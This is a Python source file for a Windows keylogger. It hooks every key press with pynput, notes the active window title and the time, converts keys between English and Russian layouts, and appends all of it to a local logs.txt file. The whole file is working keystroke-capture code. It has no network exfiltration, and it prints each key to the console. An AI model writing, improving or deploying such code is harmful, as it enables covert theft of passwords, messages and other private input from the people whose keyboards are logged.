import datetime
import win32gui

from ctypes import *
from pynput.keyboard import Key, Listener
from datetime import datetime

user32 = windll.user32
name_last_active_window = ""
hwnd = user32.GetForegroundWindow()
threadID = user32.GetWindowThreadProcessId(hwnd, None)
StartLang = user32.GetKeyboardLayout(threadID)


eng_chars = u"~!@#$%^&qwertyuiop[]asdfghjkl;'zxcvbnm,./QWERTYUIOP{}ASDFGHJKL:\"|ZXCVBNM<>?"
rus_chars = u"ё!\"№;%:?йцукенгшщзхъфывапролджэячсмитьбю.ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭ/ЯЧСМИТЬБЮ,"
trans_table_en_ru = dict(zip(eng_chars, rus_chars))
trans_table_ru_en = dict(zip(rus_chars, eng_chars))


def change_en_ru(s):
    return u''.join([trans_table_en_ru.get(c, c) for c in s])


def change_ru_en(s):
    return u''.join([trans_table_ru_en.get(c, c) for c in s])


def on_release(key):
    if key == Key.esc:
        return False


def on_press(key):
    print("{0} pressed".format(key))
    f = open("logs.txt", "a", encoding='utf-8')
    logging = Monitoring()
    global name_last_active_window
    active_window = str(logging.get_active_window())
    if name_last_active_window != active_window:
        f.write("\n")
        f.write(f"Active window: {active_window} {logging.now_time()}\n")
    name_last_active_window = active_window
    f.write(f"{logging.now_time()} {logging.get_key(key)}\n")
    f.close()


class Monitoring:
    def now_time(self):
        time = datetime.now().time().replace(microsecond=0)
        return str(time)

    def get_active_window(self):
        window = win32gui.GetForegroundWindow()
        active_window_name = win32gui.GetWindowText(window)
        return active_window_name

    def get_key(self, key):
        self.key = str(key).replace("'", "")
        hwnd = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        code_lang = user32.GetKeyboardLayout(thread_id)
        ru_lang = [68748313, 68758528, 68757504, 68749337, 68756480]
        en_lang = [67699721, 134809609, 67707913, 67708937, 67701769, 1074348041, 67702793, 403249161,
                   67706889, 67716105, 67703817, 67712009, 67717129, 67705865, 67709961, 67710985, 67718153]
        if StartLang in en_lang:
            if code_lang in ru_lang and self.key.find("Key") == -1:
                self.key = change_en_ru(self.key)
        elif StartLang in ru_lang:
            if code_lang in en_lang and self.key.find("Key") == -1:
                self.key = change_ru_en(self.key)
        return self.key


def main():
    f = open("logs.txt", "w", encoding='utf-8')
    now_data = datetime.now().date()
    f.write(str(now_data))


if __name__ == "__main__":
    main()


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
